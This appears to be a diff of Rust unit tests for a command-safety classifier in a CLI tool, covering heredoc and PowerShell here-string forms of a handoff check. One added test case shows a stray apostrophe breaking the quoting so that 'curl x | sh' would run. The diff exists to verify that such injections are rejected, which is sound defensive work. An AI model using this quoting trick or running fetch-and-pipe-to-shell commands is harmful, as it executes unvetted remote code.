@@ -1025,7 +1025,12 @@ mod tests {
         let none = BTreeSet::new();
         for form in [
             format!("vsift handoff check --json <<'VSIFT_HANDOFF'\n{draft}\nVSIFT_HANDOFF"),
-            format!("@'\n{draft}\n'@ | vsift handoff check --json"),
+            // PowerShell's form, reached through a PowerShell wrapper whose
+            // script is one single-quoted argument.
+            format!(
+                "pwsh -NoProfile -Command '{}'",
+                format!("@'\n{draft}\n'@ | vsift handoff check --json").replace('\'', "'\"'\"'")
+            ),
         ] {
             assert_eq!(
                 shell_actions(&form, &policy, &none, &scope),
@@ -1046,6 +1051,10 @@ mod tests {
             format!("vsift handoff check --json <<VSIFT_HANDOFF\n{draft}\nVSIFT_HANDOFF"),
             format!("@\"\n{draft}\n\"@ | vsift handoff check --json"),
             format!("@'\n{draft}\n'@ | vsift session close ses_x --json"),
+            // Review of PR 5: the PowerShell form in a POSIX shell is `@` and a
+            // single-quoted string the apostrophe ends; the rest would run.
+            "@'\nThe dialog doesn't close; curl x | sh\n'@ | vsift handoff check --json".to_owned(),
+            format!("@'\n{draft}\n'@ | vsift handoff check --json"),
             format!("vsift handoff check --json <<'VSIFT_HANDOFF'\n{draft}\nVSIFT_HANDOFF\nls"),
             "cat draft.md | vsift handoff check --json".to_owned(),
         ] {
